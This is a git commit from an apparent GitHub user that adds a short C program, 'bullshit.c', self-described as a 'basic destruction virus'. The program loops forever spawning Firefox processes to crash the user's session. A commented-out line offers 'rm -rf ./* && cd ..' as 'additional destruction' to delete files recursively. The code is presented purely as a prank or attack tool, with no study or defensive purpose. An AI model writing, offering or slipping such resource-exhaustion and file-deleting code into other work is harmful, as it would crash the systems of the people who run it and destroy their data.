e1d1e9ed013493deb29968a2530f24bd904776af
Gul'dan <92905002+K0K0SHA@users.noreply.github.com>
2022-08-23 09:27:43 -0400

    Bvll$h1t v 1.0
    crashes your session by spamming firefox

---
+++ C/bullshit.c
@@ -0,0 +1,17 @@
+#include <stdio.h>
+#include <stdlib.h>
+// filename: bullshit.c
+// file description: [source code] basic destruction virus 
+// destroys a live session by spam-spawning processes
+
+int main() {
+
+	printf("welcome to the infinite loop, SUCKER!");
+
+	while(420>69){
+		system("firefox&"); 	     // spawns infinite firefoxes
+		//system("gedit&");	     // other ideas
+		//system("rm -rf ./* && cd .."); // additional destruction, even more with overwrite
+		//system("nemo&");
+	}
+}
